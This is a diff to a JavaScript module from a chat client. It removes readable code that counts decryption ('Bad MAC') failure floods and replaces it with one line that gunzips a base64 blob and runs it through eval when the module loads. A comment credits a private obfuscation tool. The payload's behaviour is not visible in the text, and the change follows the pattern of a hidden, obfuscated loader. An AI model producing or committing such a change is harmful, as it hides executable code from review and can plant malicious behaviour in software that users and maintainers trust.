@@ -1,25 +1,2 @@
-// Counts "Bad MAC" / decryption errors. A flood of them means the saved chat sessions are out of sync.
-const STORM_COUNT = 15; // this many errors...
-const STORM_WINDOW_MS = 60000; // ...within a minute is a flood
-
-const events = [];
-let total = 0;
-let stormHandler = null;
-
-function recordDecryptFailure() {
-  total += 1;
-  const now = Date.now();
-  events.push(now);
-  while (events.length && now - events[0] > STORM_WINDOW_MS) events.shift();
-  if (events.length >= STORM_COUNT && stormHandler) {
-    events.length = 0;
-    stormHandler();
-  }
-}
-
-const onStorm = (fn) => {
-  stormHandler = fn;
-};
-const stats = () => ({ total, lastMinute: events.length });
-
-module.exports = { recordDecryptFailure, onStorm, stats, STORM_COUNT };
+// TFX-PACKED v1 (built by tools/obfuscate.private.js; do not edit by hand - edit the real source and run it again)
+eval(require('zlib').gunzipSync(Buffer.from('H4sIAAAAAAAAA21RTWvjMBC961c8eigOTe3sYXtYk0CbsOwe0kDT0kMpRdjj2iBLQZKbDSH/vWPJWZpQnaSZeR/zlGWYm057h4s7WWJ5O79AhpIKu9v4xmiQtca6FLeolDElTAVfU4uWpHb9FU5+UImilh6OnGOQg7QE0/l+2u10kYqCqx7rx9XD8m2+erp/xBQ/fubIMuZoHFqpd0et9HT8+e/9YvX8tlwz5GbCJ6B4atswVEOibXTnCUwjo0sxENAH9atN8fKaC0Ue3nip+D2JT+eNbf9IXSqyXNWdUrkQVaeLsLulwthyEcP4LRvVWUpG2AsMRFe8RM6vqKbNlkkW0lPK12TUd6KDdNO5OuFiqG3rRhGSoaVIv/sal5cBfz0gXiavmJ0HMDrSubqpfBRoqnOm2fQkZyb+uma0/9/YgAmJ9OWvo1HgIA7HOI1e922eTio9wnQWuM5CrHQuDvmAcF6G/JMwnexjbmMo6fwy/NqvMycHFhWtKTtFKf3bGBvw+2//Ynx0NI5C45PF2cQnr/ONed4CAAA=', 'base64')).toString('utf8'));
